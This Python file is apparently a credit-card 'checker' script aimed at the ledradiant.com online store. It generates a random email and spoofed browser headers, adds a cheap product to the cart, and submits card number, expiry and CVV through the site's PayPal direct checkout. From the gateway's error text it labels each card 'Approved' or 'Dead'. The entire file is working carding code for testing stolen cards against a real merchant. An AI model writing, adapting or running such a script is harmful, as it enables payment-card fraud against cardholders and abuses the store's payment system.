import random
import re
import names
from requests import Session
from dataclasses import dataclass
import requests
import uuid
from fake_useragent import UserAgent
class ConfigsPAge:
    @classmethod
    def QueryText(self, data:str=None, chainOne:str=None, chainTwo:str=None):

        try:               return data[ data.index(chainOne) + len (chainOne):data.index(chainTwo,  data.index(chainOne) + len (chainOne))]
        except ValueError: return None 

    @classmethod
    def RandomName(self, dato: str = None):
        if dato == 'email':
            self.email = "{}{}{}@gmail.com".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000, 9999999)
            )
            return self.email
        
        else:
            return 'Valores incorrectos: >>>   ConfigsPAge().RandomName("username")'

@dataclass
class payflow_pro:
    def main(self, card):
        try:
            self.UseMail = ConfigsPAge().RandomName('email')
            self.card = card
            self.ccs = card.split('|')
            if self.ccs[0].startswith("4"): self.brand = "VI"
            if self.ccs[0].startswith("3"): self.brand = "AE"
            elif self.ccs[0].startswith("5"): self.brand = "MC"
            session = requests.Session()
            Agent = UserAgent().random
            guid = str(uuid.uuid4()).replace('-', '') + 'f532e2'
            muid = str(uuid.uuid4()).replace('-', '') + 'f532e2'
            sid = str(uuid.uuid4()).replace('-', '') + '438b7a'
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.5',
                'cache-control': 'max-age=0',
                'priority': 'u=0, i',
                'referer': 'https://ledradiant.com/led-lights/led-rope-stripe-accessorie',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Brave";v="145", "Chromium";v="145"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': Agent,
                # 'cookie': 'frontend=0ap5oovgjpm36ek6v1lq9sspv5; frontend_cid=fjPY32ZRUQbhCQDW; cf_clearance=F06RAU5O6EqGFaeFRFxuyFa_Dje6Y4ah_J8CGOsN0bM-1772247337-1.2.1.1-71spSi1ucbyjKnoICGNtHuMuDlYUQvovXXCfVfgy1SBmgmQMPfNpt82VfE7BSHV8SqADY_wL46uVm5rd46GiEc5XX24w6MSb.unLZJXlQD7GQMgYC5mjx9R4qXVorq27ipqc3nZvBquHcBMQVtdWqHx8FBM5.la9MVvpMTI3Ws4AKjm4sQx0EiYODefaqZXOCXDHqf1Z7nS7gnn61B69y17_fIzJjg9AGve478aLB1k; popup_ids=6a973g=1772247425.864; popupData=magentoSessionId%3A0ap5oovgjpm36ek6v1lq9sspv5%7ClastSession%3A0ap5oovgjpm36ek6v1lq9sspv5%7CcartProductIds%3A%7CcartSubtotal%3A0%7CcustomerGroupId%3A0%7CloggedIn%3A0%7CisSubscribed%3A%7CpendingOrder%3A0; FPC_PRODUCT_VIEWED=1930%2C; external_no_cache=1',
            }

            response = session.get(
                'https://ledradiant.com/2-4-watt-p-feet-led-strip-ropelight-1-ft-multicolor-rgb-70-lm-p-watt',
            
                headers=headers,
            )
            headers = {
                'accept': 'text/javascript, text/html, application/xml, text/xml, */*',
                'accept-language': 'es-ES,es;q=0.5',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://ledradiant.com',
                'priority': 'u=1, i',
                'referer': 'https://ledradiant.com/2-4-watt-p-feet-led-strip-ropelight-1-ft-multicolor-rgb-70-lm-p-watt',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Brave";v="145", "Chromium";v="145"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': Agent,
                'x-prototype-version': '1.7',
                'x-requested-with': 'XMLHttpRequest',
                # 'cookie': 'frontend=0ap5oovgjpm36ek6v1lq9sspv5; frontend_cid=fjPY32ZRUQbhCQDW; cf_clearance=F06RAU5O6EqGFaeFRFxuyFa_Dje6Y4ah_J8CGOsN0bM-1772247337-1.2.1.1-71spSi1ucbyjKnoICGNtHuMuDlYUQvovXXCfVfgy1SBmgmQMPfNpt82VfE7BSHV8SqADY_wL46uVm5rd46GiEc5XX24w6MSb.unLZJXlQD7GQMgYC5mjx9R4qXVorq27ipqc3nZvBquHcBMQVtdWqHx8FBM5.la9MVvpMTI3Ws4AKjm4sQx0EiYODefaqZXOCXDHqf1Z7nS7gnn61B69y17_fIzJjg9AGve478aLB1k; popup_ids=6a973g=1772247425.864; popupData=magentoSessionId%3A0ap5oovgjpm36ek6v1lq9sspv5%7ClastSession%3A0ap5oovgjpm36ek6v1lq9sspv5%7CcartProductIds%3A%7CcartSubtotal%3A0%7CcustomerGroupId%3A0%7CloggedIn%3A0%7CisSubscribed%3A%7CpendingOrder%3A0; FPC_PRODUCT_VIEWED=1930%2C; external_no_cache=1',
            }

            data = {
                'product': '1930',
                'related_product': '',
                'qty': '1',
            }

            response = session.post(
                'https://ledradiant.com/mdlajaxcheckout/index/cart/cart/add/uenc/aHR0cHM6Ly9sZWRyYWRpYW50LmNvbS8yLTQtd2F0dC1wLWZlZXQtbGVkLXN0cmlwLXJvcGVsaWdodC0xLWZ0LW11bHRpY29sb3ItcmdiLTcwLWxtLXAtd2F0dA,,/product/1930/form_key/cDVF2w5dPHihbqKa/',
            
                headers=headers,
                data=data,
            ).cookies
            print(response)
            
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.5',
                'priority': 'u=0, i',
                'referer': 'https://ledradiant.com/2-4-watt-p-feet-led-strip-ropelight-1-ft-multicolor-rgb-70-lm-p-watt',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Brave";v="145", "Chromium";v="145"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': Agent,
                # 'cookie': 'frontend=0ap5oovgjpm36ek6v1lq9sspv5; frontend_cid=fjPY32ZRUQbhCQDW; cf_clearance=F06RAU5O6EqGFaeFRFxuyFa_Dje6Y4ah_J8CGOsN0bM-1772247337-1.2.1.1-71spSi1ucbyjKnoICGNtHuMuDlYUQvovXXCfVfgy1SBmgmQMPfNpt82VfE7BSHV8SqADY_wL46uVm5rd46GiEc5XX24w6MSb.unLZJXlQD7GQMgYC5mjx9R4qXVorq27ipqc3nZvBquHcBMQVtdWqHx8FBM5.la9MVvpMTI3Ws4AKjm4sQx0EiYODefaqZXOCXDHqf1Z7nS7gnn61B69y17_fIzJjg9AGve478aLB1k; popup_ids=6a973g=1772247425.864; FPC_PRODUCT_VIEWED=1930%2C; external_no_cache=1; popupData=magentoSessionId%3A%7ClastSession%3A0ap5oovgjpm36ek6v1lq9sspv5%7CcartProductIds%3A1930%7CcartSubtotal%3A1.15%7CcustomerGroupId%3A0%7CloggedIn%3A0%7CisSubscribed%3A%7CpendingOrder%3A0',
            }

            response = session.get('https://ledradiant.com/checkout/cart/',  headers=headers).text
            form_k = ConfigsPAge().QueryText(response, 'name="form_key" type="hidden" value="', '"')
            print(form_k)
                
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.5',
                'priority': 'u=0, i',
                'referer': 'https://ledradiant.com/checkout/cart/',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Brave";v="145", "Chromium";v="145"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': Agent,
                # 'cookie': 'frontend=0ap5oovgjpm36ek6v1lq9sspv5; frontend_cid=fjPY32ZRUQbhCQDW; cf_clearance=F06RAU5O6EqGFaeFRFxuyFa_Dje6Y4ah_J8CGOsN0bM-1772247337-1.2.1.1-71spSi1ucbyjKnoICGNtHuMuDlYUQvovXXCfVfgy1SBmgmQMPfNpt82VfE7BSHV8SqADY_wL46uVm5rd46GiEc5XX24w6MSb.unLZJXlQD7GQMgYC5mjx9R4qXVorq27ipqc3nZvBquHcBMQVtdWqHx8FBM5.la9MVvpMTI3Ws4AKjm4sQx0EiYODefaqZXOCXDHqf1Z7nS7gnn61B69y17_fIzJjg9AGve478aLB1k; popup_ids=6a973g=1772247425.864; FPC_PRODUCT_VIEWED=1930%2C; external_no_cache=1; popupData=magentoSessionId%3A0ap5oovgjpm36ek6v1lq9sspv5%7ClastSession%3A0ap5oovgjpm36ek6v1lq9sspv5%7CcartProductIds%3A1930%7CcartSubtotal%3A1.15%7CcustomerGroupId%3A0%7CloggedIn%3A0%7CisSubscribed%3A%7CpendingOrder%3A0',
            }

            response = session.get('https://ledradiant.com/onepagecheckout/',  headers=headers)

            headers = {
                'accept': 'text/javascript, text/html, application/xml, text/xml, */*',
                'accept-language': 'es-ES,es;q=0.5',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://ledradiant.com',
                'priority': 'u=1, i',
                'referer': 'https://ledradiant.com/onepagecheckout/',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Brave";v="145", "Chromium";v="145"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': Agent,
                'x-prototype-version': '1.7',
                'x-requested-with': 'XMLHttpRequest',
                # 'cookie': 'frontend=0ap5oovgjpm36ek6v1lq9sspv5; frontend_cid=fjPY32ZRUQbhCQDW; popup_ids=6a973g=1772247425.864; FPC_PRODUCT_VIEWED=1930%2C; external_no_cache=1; popupData=magentoSessionId%3A0ap5oovgjpm36ek6v1lq9sspv5%7ClastSession%3A0ap5oovgjpm36ek6v1lq9sspv5%7CcartProductIds%3A1930%7CcartSubtotal%3A1.15%7CcustomerGroupId%3A0%7CloggedIn%3A0%7CisSubscribed%3A%7CpendingOrder%3A0; cf_clearance=cWjkQmjqxzD63pDJJ5CYqUuJwGtDZuoVetFVb6DE81U-1772248083-1.2.1.1-X5YL5MOy_o2hZdanP2FiKtcFaKYxNFkf965OMQmnHkjIc8STQE.Id4XjuJ9qtxV_QbwsMPm5gBqIZ6tJcgD0UPcVfKi3yo9AHLotNGWlWdJWB_Fzk0OBAMa9YkvvNh_VteJ_slHpAhZSQ.8YhpsbHm1epu7h7NnMISGIsYOz7QwAcCRNXGQPtEgGTfCskFylkUKhQ0o6ODnH56j9FTJA3pdVyzcDC_6u7zguIg3bGEo',
            }

            data = {
                'billing[address_id]': '42719',
                'billing[firstname]': 'ldfl',
                'billing[lastname]': 'dsdasd',
                'billing[email]': 'banes42563@rohoza.com',
                'billing[company]': 'ggd',
                'billing[street][]': [
                    'moall del sol',
                    'sadw',
                ],
                'billing[city]': 'guayas',
                'billing[region_id]': '43',
                'billing[region]': '',
                'billing[postcode]': '10080',
                'billing[telephone]': '0989861371',
                'billing[country_id]': 'US',
                'billing[taxvat]': '0989861371',
                'billing[customer_password]': '',
                'billing[confirm_password]': '',
                'billing[save_in_address_book]': '1',
                'billing[use_for_shipping]': '1',
                'shipping[same_as_billing]': '1',
                'shipping[address_id]': '42719',
                'shipping[firstname]': 'ldfl',
                'shipping[lastname]': 'dsdasd',
                'shipping[company]': 'ggd',
                'shipping[street][]': [
                    'moall del sol',
                    'sadw',
                ],
                'shipping[city]': 'guayas',
                'shipping[region_id]': '43',
                'shipping[region]': '',
                'shipping[postcode]': '10080',
                'shipping[telephone]': '0989861371',
                'shipping[country_id]': 'US',
                'shipping[save_in_address_book]': '1',
                'shipping_method': 'freeshipping_freeshipping',
                'payment[method]': 'paypal_direct',
                'payment[cc_type]': self.brand,
                'payment[cc_number]': self.ccs[0],
                'payment[cc_exp_month]': self.ccs[1],
                'payment[cc_exp_year]': self.ccs[2],
                'payment[cc_cid]': self.ccs[3],
                'process_coupon': '0',
                'coupon[remove]': '0',
                'coupon[code]': '',
                'order-comment': '',
                'newsletter': '1',
                'review': '1',
            }

            response = session.post(
                'https://ledradiant.com/onepagecheckout/index/updateCheckout/',
            
                headers=headers,
                data=data,
            )
            headers = {
                'accept': 'text/javascript, text/html, application/xml, text/xml, */*',
                'accept-language': 'es-ES,es;q=0.5',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://ledradiant.com',
                'priority': 'u=1, i',
                'referer': 'https://ledradiant.com/onepagecheckout/',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Brave";v="145", "Chromium";v="145"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': Agent,
                'x-prototype-version': '1.7',
                'x-requested-with': 'XMLHttpRequest',
                # 'cookie': 'frontend=0ap5oovgjpm36ek6v1lq9sspv5; frontend_cid=fjPY32ZRUQbhCQDW; popup_ids=6a973g=1772247425.864; FPC_PRODUCT_VIEWED=1930%2C; external_no_cache=1; popupData=magentoSessionId%3A0ap5oovgjpm36ek6v1lq9sspv5%7ClastSession%3A0ap5oovgjpm36ek6v1lq9sspv5%7CcartProductIds%3A1930%7CcartSubtotal%3A1.15%7CcustomerGroupId%3A0%7CloggedIn%3A0%7CisSubscribed%3A%7CpendingOrder%3A0; cf_clearance=cWjkQmjqxzD63pDJJ5CYqUuJwGtDZuoVetFVb6DE81U-1772248083-1.2.1.1-X5YL5MOy_o2hZdanP2FiKtcFaKYxNFkf965OMQmnHkjIc8STQE.Id4XjuJ9qtxV_QbwsMPm5gBqIZ6tJcgD0UPcVfKi3yo9AHLotNGWlWdJWB_Fzk0OBAMa9YkvvNh_VteJ_slHpAhZSQ.8YhpsbHm1epu7h7NnMISGIsYOz7QwAcCRNXGQPtEgGTfCskFylkUKhQ0o6ODnH56j9FTJA3pdVyzcDC_6u7zguIg3bGEo',
            }

            data = {
                'billing[address_id]': '42719',
                'billing[firstname]': 'ldfl',
                'billing[lastname]': 'dsdasd',
                'billing[email]': 'banes42563@rohoza.com',
                'billing[company]': 'ggd',
                'billing[street][]': [
                    'moall del sol',
                    'sadw',
                ],
                'billing[city]': 'guayas',
                'billing[region_id]': '43',
                'billing[region]': '',
                'billing[postcode]': '10080',
                'billing[telephone]': '0989861371',
                'billing[country_id]': 'US',
                'billing[taxvat]': '0989861371',
                'billing[customer_password]': '',
                'billing[confirm_password]': '',
                'billing[save_in_address_book]': '1',
                'billing[use_for_shipping]': '1',
                'shipping[same_as_billing]': '1',
                'shipping[address_id]': '42719',
                'shipping[firstname]': 'ldfl',
                'shipping[lastname]': 'dsdasd',
                'shipping[company]': 'ggd',
                'shipping[street][]': [
                    'moall del sol',
                    'sadw',
                ],
                'shipping[city]': 'guayas',
                'shipping[region_id]': '43',
                'shipping[region]': '',
                'shipping[postcode]': '10080',
                'shipping[telephone]': '0989861371',
                'shipping[country_id]': 'US',
                'shipping[save_in_address_book]': '1',
                'shipping_method': 'flatrate_flatrate',
                'payment[method]': 'paypal_direct',
                'payment[cc_type]': self.brand,
                'payment[cc_number]': self.ccs[0],
                'payment[cc_exp_month]': self.ccs[1],
                'payment[cc_exp_year]': self.ccs[2],
                'payment[cc_cid]': self.ccs[3],
                'process_coupon': '0',
                'coupon[remove]': '0',
                'coupon[code]': '',
                'order-comment': '',
                'newsletter': '1',
            }

            response = session.post('https://ledradiant.com/onepagecheckout/index/saveOrder/', headers=headers, data=data).text
            error = ConfigsPAge().QueryText(response, '"error_messages":"PayPal gateway has rejected request.','"')
            print(error)

            if 'This transaction cannot be processed. Please enter a valid Credit Card Verification Number (#15004: Gateway Decline).' in error: return 'Approved! ✅', error
            else: return 'Dead! ❌', error
        except: return 'Dead! ❌','This transaction cannot be processed (#15005: Processor Decline).'